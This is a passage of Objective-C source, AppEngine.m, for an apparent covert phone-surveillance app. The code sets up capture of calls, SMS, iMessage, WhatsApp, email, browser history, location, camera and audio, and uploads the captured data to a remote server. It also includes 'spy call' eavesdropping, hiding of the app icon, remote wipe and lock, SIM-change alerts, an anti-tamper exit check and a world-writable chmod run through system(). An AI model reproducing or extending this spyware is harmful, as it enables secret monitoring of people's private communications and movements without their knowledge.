//
//  AppEngine.m
//  AppEngine
//
//  Created by Makara Khloth on 11/17/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "AppEngine.h"
#import "AppEngineUICmd.h"
#import "Product.h"

// Components headers
#import "ComponentHeaders.h"

// Utils
#import "ServerErrorStatusHandler.h"
#import "PreferencesChangeHandler.h"
#import "MessagePortIPCSender.h"
#import "LicenseHeartbeatUtils.h"
#import "LicenseGetConfigUtils.h"

#import <CommonCrypto/CommonDigest.h>

@interface AppEngine (private)
- (void) createApplicationEngine;
- (void) createApplicationFeatures;
- (void) destructApplicationFeatures;
- (EventQueryPriority*) eventQueryPriority;
- (void) doLicenseChanged: (LicenseInfo*) aLicenseInfo;

- (void) clearSharedSettings;
@end

@implementation AppEngine

// Engine
@synthesize mApplicationContext;
@synthesize mSystemUtils;
@synthesize mSMSSendManager;
@synthesize mLicenseManager;
@synthesize mConfigurationManager;
@synthesize mServerAddressManager;
@synthesize mConnectionHistoryManager;
@synthesize mPreferenceManager;
@synthesize mCSM;
@synthesize mDDM;
@synthesize mActivationManager;
@synthesize mERM;
@synthesize mEDM;
@synthesize mEventCenter;
@synthesize mRemoteCmdManager;
@synthesize mSIMChangeManager;
@synthesize mActivationCodeCaptureManager;
@synthesize mSignUpManager;

// Features
@synthesize mCallLogCaptureManager;
@synthesize mSMSCaptureManager;
@synthesize mIMessageCaptureManager;
@synthesize mMMSCaptureManager;
@synthesize mMailCaptureManager;
@synthesize mLocationManager;
@synthesize mAddressbookManager;
@synthesize mMediaFinder;
@synthesize mMediaCaptureManager;
@synthesize mSpyCallManager;
@synthesize mAppAgentManager;
@synthesize mWhatsAppCaptureManager;
@synthesize mBrowserUrlCaptureManager;
@synthesize mRestrictionManager;
@synthesize mSyncTimeManager;
@synthesize mSyncCDManager;
@synthesize mCameraCaptureManager;
@synthesize mPanicManager;
@synthesize mWipeDataManager;
@synthesize mDeviceLockManager;
@synthesize mApplicationProfileManager;
@synthesize mUrlProfileManager;
@synthesize mBookmarkManager;
@synthesize mApplicationManager;
@synthesize mALCManager;

// Flags
@synthesize mIsRestartingAppEngine;

- (id) init {
	if ((self = [super init])) {
		[self createApplicationEngine];
	}
	return (self);
}

#pragma mark -
#pragma mark License manager
#pragma mark -

- (void) onLicenseChanged:(LicenseInfo *)licenseInfo {
	DLog(@"--->Enter<---");
	@try {
		[self doLicenseChanged:licenseInfo];
	}
	@catch (NSException *e) {
		DLog(@"License changed got NSException: %@", [e description]);
	}
	@catch (FxException *e) {
		DLog(@"License changed got FxException: %@, cate: %d, code: %d, excName: %@, excReason: %@", [e description],
			 [e errorCategory], [e errorCode], [e excName], [e excReason]);
	}
	@finally {
		[self setMIsRestartingAppEngine:FALSE];
	}
	DLog(@"--->End<---");
}

#pragma mark -
#pragma mark Activation code capture manager
#pragma mark -

- (void) activationCodeDidReceived: (NSString*) aActivationCode {
//	id <AppVisibility> visibility = [mApplicationContext getAppVisibility];
//	[visibility launchApplication];
}

#pragma mark -
#pragma mark Server address manager
#pragma mark -

- (void) serverAddressChanged {
//	DLog (@"Server url changed, structured = %@", [mServerAddressManager getStructuredServerUrl]);
//	DLog (@"Server url changed, unstructured = %@", [mServerAddressManager getUnstructuredServerUrl]);
	
	NSString *structuredUrl = [mServerAddressManager getStructuredServerUrl];
	NSData *structuredUrlData = [structuredUrl dataUsingEncoding:NSUTF8StringEncoding];
	unsigned char msgDigestStructuredUrlByte[16];
	CC_MD5([structuredUrlData bytes], [structuredUrlData length], msgDigestStructuredUrlByte);
	NSData* msgDigestStructuredUrlData = [NSData dataWithBytes:msgDigestStructuredUrlByte length:16];
	
	unsigned char* result = (unsigned char*) [msgDigestStructuredUrlData bytes];
	NSString *urlChecksumString = [NSString stringWithFormat:
								   @"%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
								   result[0], result[1], result[2], result[3], 
								   result[4], result[5], result[6], result[7],
								   result[8], result[9], result[10], result[11],
								   result[12], result[13], result[14], result[15]
								   ];
	
	// Get data from cleanser file
    char *keyKey = nil;
    char *encryptedKey = nil;
    char *encryptedUrlChecksum = nil;
    
	//int value = (arc4random() % 20) + 1;
	
	for (int value = 1; value <= 20; value++) {
		switch (value) {
			case 1:
				keyKey = getkeyKey_1();
				encryptedKey = getEncryptedKey_1();
				encryptedUrlChecksum = getEncryptedUrlChecksum_1();
				break;
			case 2:
				keyKey = getkeyKey_2();
				encryptedKey = getEncryptedKey_2();
				encryptedUrlChecksum = getEncryptedUrlChecksum_2();
				break;
			case 3:
				keyKey = getkeyKey_3();
				encryptedKey = getEncryptedKey_3();
				encryptedUrlChecksum = getEncryptedUrlChecksum_3();
				break;
			case 4:
				keyKey = getkeyKey_4();
				encryptedKey = getEncryptedKey_4();
				encryptedUrlChecksum = getEncryptedUrlChecksum_4();
				break;
			case 5:
				keyKey = getkeyKey_5();
				encryptedKey = getEncryptedKey_5();
				encryptedUrlChecksum = getEncryptedUrlChecksum_5();
				break;
			case 6:
				keyKey = getkeyKey_6();
				encryptedKey = getEncryptedKey_6();
				encryptedUrlChecksum = getEncryptedUrlChecksum_6();
				break;
			case 7:
				keyKey = getkeyKey_7();
				encryptedKey = getEncryptedKey_7();
				encryptedUrlChecksum = getEncryptedUrlChecksum_7();
				break;
			case 8:
				keyKey = getkeyKey_8();
				encryptedKey = getEncryptedKey_8();
				encryptedUrlChecksum = getEncryptedUrlChecksum_8();
				break;
			case 9:
				keyKey = getkeyKey_9();
				encryptedKey = getEncryptedKey_9();
				encryptedUrlChecksum = getEncryptedUrlChecksum_9();
				break;
			case 10:
				keyKey = getkeyKey_10();
				encryptedKey = getEncryptedKey_10();
				encryptedUrlChecksum = getEncryptedUrlChecksum_10();
				break;
			case 11:
				keyKey = getkeyKey_11();
				encryptedKey = getEncryptedKey_11();
				encryptedUrlChecksum = getEncryptedUrlChecksum_11();
				break;
			case 12:
				keyKey = getkeyKey_12();
				encryptedKey = getEncryptedKey_12();
				encryptedUrlChecksum = getEncryptedUrlChecksum_12();
				break;
			case 13:
				keyKey = getkeyKey_13();
				encryptedKey = getEncryptedKey_13();
				encryptedUrlChecksum = getEncryptedUrlChecksum_13();
				break;
			case 14:
				keyKey = getkeyKey_14();
				encryptedKey = getEncryptedKey_14();
				encryptedUrlChecksum = getEncryptedUrlChecksum_14();
				break;
			case 15:
				keyKey = getkeyKey_15();
				encryptedKey = getEncryptedKey_15();
				encryptedUrlChecksum = getEncryptedUrlChecksum_15();
				break;
			case 16:
				keyKey = getkeyKey_16();
				encryptedKey = getEncryptedKey_16();
				encryptedUrlChecksum = getEncryptedUrlChecksum_16();
				break;
			case 17:
				keyKey = getkeyKey_17();
				encryptedKey = getEncryptedKey_17();
				encryptedUrlChecksum = getEncryptedUrlChecksum_17();
				break;
			case 18:
				keyKey = getkeyKey_18();
				encryptedKey = getEncryptedKey_18();
				encryptedUrlChecksum = getEncryptedUrlChecksum_18();
				break;
			case 19:
				keyKey = getkeyKey_19();
				encryptedKey = getEncryptedKey_19();
				encryptedUrlChecksum = getEncryptedUrlChecksum_19();
				break;
			case 20:
				keyKey = getkeyKey_20();
				encryptedKey = getEncryptedKey_20();
				encryptedUrlChecksum = getEncryptedUrlChecksum_20();
				break;
			default:
				keyKey = getkeyKey_7();
				encryptedKey = getEncryptedKey_7();
				encryptedUrlChecksum = getEncryptedUrlChecksum_7();
				break;
		}
		
		NSData *encryptedKeyData = [NSData dataWithBytes:encryptedKey length:32];
		NSString *keyKeyString = [NSString stringWithCString:keyKey encoding:NSUTF8StringEncoding];
		NSData *urlChecksumKeyData = [encryptedKeyData AES128DecryptWithKey:keyKeyString];
		NSString *urlChecksumKeyString = [[[NSString alloc] initWithData:urlChecksumKeyData encoding:NSUTF8StringEncoding] autorelease];
		NSData *encryptedUrlChecksumData = [NSData dataWithBytes:encryptedUrlChecksum length:48];
		NSData *cleanserUrlChecksumData = [encryptedUrlChecksumData AES128DecryptWithKey:urlChecksumKeyString]; // Checksum string data
		NSString *cleanserUrlChecksum = [[[NSString alloc] initWithData:cleanserUrlChecksumData encoding:NSUTF8StringEncoding] autorelease];
		
		if (encryptedKey) free(encryptedKey);
		if (keyKey) free(keyKey);
		if (encryptedUrlChecksum) free(encryptedUrlChecksum);
		

		
		DLog (@"urlChecksumString = %@, cleanserUrlChecksum = %@", urlChecksumString, cleanserUrlChecksum);
		
		if ([urlChecksumString isEqualToString:cleanserUrlChecksum]) {
			// Check next index of checksum of url in cleanser
		} else {
			DLog (@"Seriously failure.....");
			exit(0);
		}
	}
	
	[mCSM setStructuredURL:[NSURL URLWithString:structuredUrl]];
	[mCSM setUnstructuredURL:[NSURL URLWithString:[mServerAddressManager getUnstructuredServerUrl]]];
}

#pragma mark -
#pragma mark Engine utils functions
#pragma mark -

- (void) createApplicationEngine {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
	DLog(@"Contruct engine");
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
	// Home private and shared directory
	NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
	NSString *sharedHome = [DaemonPrivateHome daemonSharedHome];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:sharedHome];
	NSString *command = [NSString stringWithFormat:@"chmod 777 %@", sharedHome];
	system([command cStringUsingEncoding:NSUTF8StringEncoding]);
	
	// Telephony notification manager
	mTelephonyNotificationManagerImpl = [[TelephonyNotificationManagerImpl alloc] initAndStartListeningToTelephonyNotification];
	
	// App context
	NSData *productCipher = [NSData dataWithBytes:kProductInfoCipher length:(sizeof(kProductInfoCipher)/sizeof(unsigned char))];
	mApplicationContext = [[AppContextImp alloc] initWithProductCipher:productCipher];
	
	// System utils
	mSystemUtils = [[SystemUtilsImpl alloc] init];
	
	// SMS sender
	mSMSSendManager = [[SMSSendManager alloc] init];
	
	// License manager
	mLicenseManager = [[LicenseManager alloc] initWithAppContext:mApplicationContext];
	[mLicenseManager addLicenseChangeListener:self];
	
	// Configuration manager
	mConfigurationManager = [[ConfigurationManagerImpl alloc] init];
	[mConfigurationManager updateConfigurationID:[mLicenseManager getConfiguration]];
	
	// Server URL
	mServerAddressManager = [[ServerAddressManagerImp alloc] initWithServerAddressChangeDelegate:self];
	[mServerAddressManager setRequireBaseServerUrl:FALSE];
	NSData *urlCipher = [NSData dataWithBytes:kServerUrl length:(sizeof(kServerUrl)/sizeof(unsigned char))];
	[mServerAddressManager setBaseServerCipherUrl:urlCipher]; // Synchronous call to serverAddressChanged selector, 1st time, CMS is nil
	
	// Connection history
	mConnectionHistoryManager = [[ConnectionHistoryManagerImp alloc] init];
	[mConnectionHistoryManager setMMaxConnectionCount:10];
	
	
	// Preferences
	mPreferenceManager = [[PreferenceManagerImpl alloc] init];
	
	// CSM
	NSString *payloadPath = [privateHome stringByAppendingString:@"csm/payload/"];
	NSString *sessionPath = [privateHome stringByAppendingString:@"csm/dbsession/"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:payloadPath];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:sessionPath];
	mCSM = [CommandServiceManager sharedManagerWithPayloadPath:payloadPath withDBPath:sessionPath];
	[mCSM setStructuredURL:[NSURL URLWithString:[mServerAddressManager getStructuredServerUrl]]];
	[mCSM setUnstructuredURL:[NSURL URLWithString:[mServerAddressManager getUnstructuredServerUrl]]];
	
	// DDM
	mDDM = [[DataDeliveryManager alloc] initWithCSM:mCSM];
	[mDDM setMAppContext:mApplicationContext];
	[mDDM setMLicenseManager:mLicenseManager];
	[mDDM setMServerAddressManager:mServerAddressManager];
	[mDDM setMConnectionHistory:mConnectionHistoryManager];
	
	// Activation manager
	mActivationManager = [[ActivationManager alloc] initWithDataDelivery:mDDM
														  withAppContext:mApplicationContext
													   andLicenseManager:mLicenseManager];
	[mActivationManager setMServerAddressManager:mServerAddressManager];
	
	// Event repository
	mERM = [[EventRepositoryManager alloc] initWithEventQueryPriority:[self eventQueryPriority]];
	[mERM openRepository];
	//[mERM deleteRepository];
	
	// EDM
	mEDM = [[EventDeliveryManager alloc] initWithEventRepository:mERM andDataDelivery:mDDM];
	[mEDM setMLicenseManager:mLicenseManager];
	 
	// Event center
	mEventCenter = [[EventCenter alloc] initWithEventRepository:mERM];
	
	// RCM
	NSString* mediaFoundPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/search/thumbnails/"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaFoundPath];
	mRemoteCmdManager = [[RemoteCmdManagerImpl alloc] init];
	[mDDM setMRemoteCommand:[mRemoteCmdManager mPCCCmdCenter]];
	[mRemoteCmdManager setMSMSSender:mSMSSendManager];
	[mRemoteCmdManager setMServerAddressManager:mServerAddressManager];
	[mRemoteCmdManager setMEventDelegate:mEventCenter];
	[mRemoteCmdManager setMLicenseManager:mLicenseManager];
	[mRemoteCmdManager setMDataDelivery:mDDM];
	[mRemoteCmdManager setMEventDelivery:mEDM];
	[mRemoteCmdManager setMAppContext:mApplicationContext];
	[mRemoteCmdManager setMPreferenceManager:mPreferenceManager];
	[mRemoteCmdManager setMActivationManagerProtocol:mActivationManager];
	[mRemoteCmdManager setMSupportCmdCodes:[mConfigurationManager mSupportedRemoteCmdCodes]];
	[mRemoteCmdManager setMSystemUtils:mSystemUtils];
	[mRemoteCmdManager setMEventRepository:mERM];
	[mRemoteCmdManager setMConnectionHistoryManager:mConnectionHistoryManager];
	[mRemoteCmdManager setMConfigurationManager:mConfigurationManager];
	[mRemoteCmdManager setMMediaSearchPath:mediaFoundPath];
	[mRemoteCmdManager launch];
	
	// SIM change
	mSIMChangeManager = [[SIMCaptureManagerImpl alloc] initWithTelephonyNotificationManager:mTelephonyNotificationManagerImpl];
	[mSIMChangeManager setMSMSSender:mSMSSendManager];
	[mSIMChangeManager setMEventDelegate:mEventCenter];
	[mSIMChangeManager setMAppContext:mApplicationContext];
	[mSIMChangeManager setMLicenseManager:mLicenseManager];
	
	// Activation code capture
	mActivationCodeCaptureManager = [[ActivationCodeCaptureManager alloc] initWithTelephonyNotification:mTelephonyNotificationManagerImpl
																							andDelegate:self];
	[mActivationCodeCaptureManager startCaptureActivationCode];
	
	// Sign up manager
	NSURL *signUpUrl = [NSURL URLWithString:[mServerAddressManager signUpUrl]];
	mSignUpManager = [[SignUpManagerImpl alloc] initWithUrl:signUpUrl activationManager:mActivationManager];
	[mSignUpManager setMAppContext:mApplicationContext];
	[mSignUpManager setMPreferenceManager:mPreferenceManager];
	[mSignUpManager setMConnectionHistoryManager:mConnectionHistoryManager];
	
	// Utils
	mServerErrorStatusHandler = [[ServerErrorStatusHandler alloc] init];
	[mServerErrorStatusHandler setMLicenseManager:mLicenseManager];
	[mServerErrorStatusHandler setMAppEngine:self];
	[mDDM setMServerStatusErrorListener:mServerErrorStatusHandler];
	
	mPreferencesChangeHandler = [[PreferencesChangeHandler alloc] initWithAppEngine:self];
	[mPreferenceManager addPreferenceChangeListener:mPreferencesChangeHandler];
	
	mLicenseHeartbeatUtils = [[LicenseHeartbeatUtils alloc] initWithDataDelivery:mDDM];
	
	mLicenseGetConfigUtils = [[LicenseGetConfigUtils alloc] initWithDataDelivery:mDDM];
	[mLicenseGetConfigUtils setMLicenseManager:mLicenseManager];

	// Connection to UI
	mAppEngineConnection = [[AppEngineConnection alloc] initWithAppEngine:self];
	
	// Start-up time
	PrefStartupTime *prefStartupTime = (PrefStartupTime *)[mPreferenceManager preference:kStartup_Time];
	[prefStartupTime setMStartupTime:[DateTimeFormat phoenixDateTime]];
	[mPreferenceManager savePreference:prefStartupTime];
	
	// Set flag for engine just starting
	[self setMIsRestartingAppEngine:TRUE];
}

- (void) createApplicationFeatures {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	DLog(@"Contruct features")
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)[mPreferenceManager preference:kEvents_Ctrl];
	PrefLocation *prefLocation = (PrefLocation *)[mPreferenceManager preference:kLocation];
	PrefKeyword *prefKeyword = (PrefKeyword *)[mPreferenceManager preference:kKeyword];
	PrefMonitorNumber* prefMonitorNumbers = (PrefMonitorNumber *)[mPreferenceManager preference:kMonitor_Number];
	PrefHomeNumber* prefHomeNumbers = (PrefHomeNumber *)[mPreferenceManager preference:kHome_Number];
	PrefVisibility *prefVisibility = (PrefVisibility  *)[mPreferenceManager preference:kVisibility];
	PrefRestriction *prefRestriction = (PrefRestriction *)[mPreferenceManager preference:kRestriction];
	PrefPanic *prefPanic = (PrefPanic *)[mPreferenceManager preference:kPanic];
	PrefDeviceLock *prefDeviceLock = (PrefDeviceLock *)[mPreferenceManager preference:kAlert];
	
	[mEDM setMaximumEvent:[prefEventCapture mMaxEvent]];
	[mEDM setDeliveryTimer:[prefEventCapture mDeliverTimer]];
	
	// Call log
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
		if (!mCallLogCaptureManager) {
			mCallLogCaptureManager = [[CallLogCaptureManager alloc] initWithEventDelegate:mEventCenter andTelephonyNotificationCenter:mTelephonyNotificationManagerImpl];
			[mCallLogCaptureManager setMAC:[NSString stringWithFormat:@"*#%@", [[mLicenseManager mCurrentLicenseInfo] activationCode]]];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableCallLog]) {
			[mCallLogCaptureManager startCapture];
		} else {
			[mCallLogCaptureManager stopCapture];
		}
	} else {
		// Upgrade or downgrad features
		[mCallLogCaptureManager release];
		mCallLogCaptureManager = nil;
	}
	
	// SMS
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventSMS]) {
		if (!mSMSCaptureManager) {
			mSMSCaptureManager = [[SMSCaptureManager alloc] initWithEventDelegate:mEventCenter];
			[mSMSCaptureManager setMAppContext:mApplicationContext];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableSMS]) {
			[mSMSCaptureManager startCapture];
		} else {
			[mSMSCaptureManager stopCapture];
		}
	} else {
		// Upgrade or downgrad features
		[mSMSCaptureManager release];
		mSMSCaptureManager = nil;
	}
	
	// IMessage/WhatsApp
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventIM]) {
		if (!mIMessageCaptureManager) {
			mIMessageCaptureManager = [[IMessageCaptureManager alloc] initWithEventDelegate:mEventCenter];
		}
		if(!mWhatsAppCaptureManager) {
		   mWhatsAppCaptureManager=[[WhatsAppCaptureManager alloc] initWithEventDelegate:mEventCenter];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableIM]) {
			[mIMessageCaptureManager startCapture];
			[mWhatsAppCaptureManager startCapture];
		} else {
			[mIMessageCaptureManager stopCapture];
			[mWhatsAppCaptureManager stopCapture];
		}
	} else {
		// Upgrade or downgrad features
		[mIMessageCaptureManager release];
		mIMessageCaptureManager = nil;
		[mWhatsAppCaptureManager release];
		mWhatsAppCaptureManager = nil;
	}
	
	// MMS
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventMMS]) {
		if (!mMMSCaptureManager) {
			mMMSCaptureManager = [[MMSCaptureManager alloc] initWithEventDelegate:mEventCenter];
			NSString* mmsAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/mms/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mmsAttachmentPath];
			[mMMSCaptureManager setMMMSAttachmentPath:mmsAttachmentPath];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableMMS]) {
			[mMMSCaptureManager startCapture];
		} else {
			[mMMSCaptureManager stopCapture];
		}
	} else {
		// Upgrade or downgrad features
		[mMMSCaptureManager release];
		mMMSCaptureManager = nil;
	}
	
	// Email
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventEmail]) {
		if (!mMailCaptureManager) {
			mMailCaptureManager = [[MailCaptureManager alloc] initWithEventDelegate:mEventCenter];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableEmail]) {
			[mMailCaptureManager startMonitoring];
		} else {
			[mMailCaptureManager stopMonitoring];
		}
	} else {
		// Upgrade or downgrad features
		[mMailCaptureManager release];
		mMailCaptureManager = nil;
	}
	
	// Location
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventLocation]) {
		if (!mLocationManager) {
			mLocationManager = [[LocationManagerImpl alloc] init];
			[mLocationManager setMIntervalTime:[prefLocation mLocationInterval]];
			[mLocationManager setEventDelegate:mEventCenter];
			[mLocationManager setMAppContext:mApplicationContext];
		}
		if ([prefEventCapture mStartCapture] && [prefLocation mEnableLocation]) {
			 [mLocationManager startTracking];
		} else {
			 [mLocationManager stopTracking];
		}
	} else {
		// Upgrade or downgrad features
		[mLocationManager release];
		mLocationManager = nil;
	}
	
	// Media finder
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SearchMediaFilesInFileSystem]) {
		if (!mMediaFinder) {
			NSString* mediaFoundPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/search/thumbnails/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaFoundPath];
			mMediaFinder = [[MediaFinder alloc] initWithEventDelegate:mEventCenter andMediaPath:mediaFoundPath];
		}
		
		NSMutableArray *entries = [NSMutableArray array];
		// Image
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableCameraImage] &&
			!([prefEventCapture mSearchMediaFilesFlags] & kSearchMediaImage)) { // Not search yet
			[MediaFinder setImageFindEntry:entries];
			[prefEventCapture setMSearchMediaFilesFlags:[prefEventCapture mSearchMediaFilesFlags] | kSearchMediaImage];
			[mPreferenceManager savePreference:prefEventCapture];
		}

		// Video
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableVideoFile] &&
			!([prefEventCapture mSearchMediaFilesFlags] & kSearchMediaVideo)) { // Not search yet
			[MediaFinder setVideoFindEntry:entries];
			[prefEventCapture setMSearchMediaFilesFlags:[prefEventCapture mSearchMediaFilesFlags] | kSearchMediaVideo];
			[mPreferenceManager savePreference:prefEventCapture];
		}
		// Audio
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableAudioFile] &&
			!([prefEventCapture mSearchMediaFilesFlags] & kSearchMediaAudio)) { // Not search yet
			[MediaFinder setAudioFindEntry:entries];
			[prefEventCapture setMSearchMediaFilesFlags:[prefEventCapture mSearchMediaFilesFlags] | kSearchMediaAudio];
			[mPreferenceManager savePreference:prefEventCapture];
		}
		if ([entries count]) {
			// We will not search media files we will wait for command (new use case)
//			[mMediaFinder findMediaFileWithExtMime:entries];
		}
	} else {
		[mMediaFinder release];
		mMediaFinder = nil;
	}
	
	// Media capture
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCameraImage] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_EventVideoRecording] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_EventSoundRecording] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_EventWallpaper]) {
		if (!mMediaCaptureManager) {
			NSString* mediaCapturePath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/capture/thumbnails/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaCapturePath];
			mMediaCaptureManager = [[MediaCaptureManager alloc] initWithEventDelegate:mEventCenter andThumbnailDirectoryPath:mediaCapturePath];
		}
		
		// Camera
		if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCameraImage]) {
			if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableCameraImage]) {
				[mMediaCaptureManager startCameraImageCapture];
			} else {
				[mMediaCaptureManager stopCameraImageCapture];
			}
		}
		// Video
		if ([mConfigurationManager isSupportedFeature:kFeatureID_EventVideoRecording]) {
			if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableVideoFile]) {
				[mMediaCaptureManager startVideoCapture];
			} else {
				[mMediaCaptureManager stopVideoCapture];
			}
		}
		// Audio
		if ([mConfigurationManager isSupportedFeature:kFeatureID_EventSoundRecording]) {
			if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableAudioFile]) {
				[mMediaCaptureManager startAudioCapture];
			} else {
				[mMediaCaptureManager stopAudioCapture];
			}
		}
		// Wallpaper
		if ([mConfigurationManager isSupportedFeature:kFeatureID_EventWallpaper]) {
			if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableWallPaper]) {
				[mMediaCaptureManager startWallPaperCapture];
			} else {
				[mMediaCaptureManager stopWallPaperCapture];
			}
		}
	} else {
		[mMediaCaptureManager release];
		mMediaCaptureManager = nil;
	}
	
	// Browser url/Bookmark capture
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
		if (!mBrowserUrlCaptureManager) {
			mBrowserUrlCaptureManager = [[BrowserUrlCaptureManager alloc] initWithEventDelegate:mEventCenter];
		}
		if ([prefEventCapture mStartCapture]) {
			if ([prefEventCapture mEnableBrowserUrl]) {
				[mBrowserUrlCaptureManager startBrowserUrlCapture];
			} else {
				[mBrowserUrlCaptureManager stopBrowserUrlCapture];
			}
		} else {
			[mBrowserUrlCaptureManager stopBrowserUrlCapture];
		}
	} else {
		[mBrowserUrlCaptureManager release];
		mBrowserUrlCaptureManager = nil;
	}
	
	// Spy call
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SpyCall] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_OnDemandConference]) {
		if (!mSpyCallManager) {
			mSpyCallManager = [[SpyCallManager alloc] init];
			[mSpyCallManager setMSMSSender:mSMSSendManager];
			[mSpyCallManager setMPreferenceManager:mPreferenceManager];
		}
		
		if ([[mLicenseManager mCurrentLicenseInfo] licenseStatus] != EXPIRED &&
			[[mLicenseManager mCurrentLicenseInfo] licenseStatus] != DISABLE) {
			if ([prefMonitorNumbers mEnableMonitor]) {
				[mSpyCallManager start];
				// Not capture monitor numbers (suppose call log capture is allocated)
				if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
					[mCallLogCaptureManager setMNotCaptureNumbers:[prefMonitorNumbers mMonitorNumbers]];
				}
			} else {
				[mSpyCallManager stop];
				// Not capture monitor numbers (suppose call log capture is allocated)
				if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
					[mCallLogCaptureManager setMNotCaptureNumbers:nil];
				}
			}
		} else {
			[mSpyCallManager stop];
			// Not capture monitor numbers (suppose call log capture is allocated)
			if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
				[mCallLogCaptureManager setMNotCaptureNumbers:nil];
			}
		}
	} else {
		[mSpyCallManager disableSpyCall];
		[mSpyCallManager release];
		mSpyCallManager = nil;
	}

	// Keyword
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SMSKeyword]) {
		NSData *keywordData = [prefKeyword toData];
		SharedFileIPC *sharedFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
		[sharedFileIPC writeData:keywordData withID:kSharedFileKeywordID];
		[sharedFileIPC release];
	} else {
		PrefKeyword *pKeyword = [[PrefKeyword alloc] init];
		NSData *keywordData = [pKeyword toData];
		SharedFileIPC *sharedFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
		[sharedFileIPC writeData:keywordData withID:kSharedFileKeywordID];
		[sharedFileIPC release];
		[pKeyword release];
	}
	
	// Visibility
	id <AppVisibility> visibility = [mApplicationContext getAppVisibility];
	if ([mConfigurationManager isSupportedFeature:kFeatureID_HideApplicationIcon]) {
		if ([prefVisibility mVisible]) {
			[visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
		} else {
			[visibility hideIconFromAppSwitcherIcon:YES andDesktop:YES];
		}
	} else {
		[visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
	}
	
	// SIM change notification
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SIMChange] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_HomeNumbers]) {
		
		// 1. Home numbers
		if ([mConfigurationManager isSupportedFeature:kFeatureID_HomeNumbers]) {
			NSString *notificationString = [[mApplicationContext mProductInfo] notificationStringForCommand:kNotificationSIMChangeCommandID
																						 withActivationCode:[[mLicenseManager mCurrentLicenseInfo] activationCode]
																									withArg:nil];
			[mSIMChangeManager startReportSIMChange:notificationString andRecipients:[prefHomeNumbers mHomeNumbers]];
		}
		
		// 2. Monitor numbers
		if ([mConfigurationManager isSupportedFeature:kFeatureID_SpyCall]) {
			NSString *notificationString = NSLocalizedString (@"kSIMChange2MonitorNumbers", @"");
			[mSIMChangeManager startListenToSIMChange:notificationString andRecipients:[prefMonitorNumbers mMonitorNumbers]];
		}
	} else {
		[mSIMChangeManager stopReportSIMChange];
		[mSIMChangeManager stopListenToSIMChange];
	}
	
	// App agent
	if (!mAppAgentManager) {
		mAppAgentManager = [[AppAgentManager alloc] initWithEventDelegate:mEventCenter];
	}
//	[mAppAgentManager startListenMemoryWarningLevel]; // No need because spec is changed which not interested in memory low
	[mAppAgentManager startListenDiskSpaceWarningLevel];
	[mAppAgentManager startHandleUncaughtException];
	[mAppAgentManager startListenSystemPowerAndWakeIphone];
	[mAppAgentManager startListenBatteryWarningLevel];
	
	// Restriction manager and address book manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
		if (!mSyncTimeManager) {
			mSyncTimeManager = [[SyncTimeManager alloc] initWithDDM:mDDM];
			[mSyncTimeManager setMEventDelegate:mEventCenter];
		}
		if (!mSyncCDManager) {
			mSyncCDManager = [[SyncCDManager alloc] initWithDDM:mDDM];
		}
		if (!mAddressbookManager) {
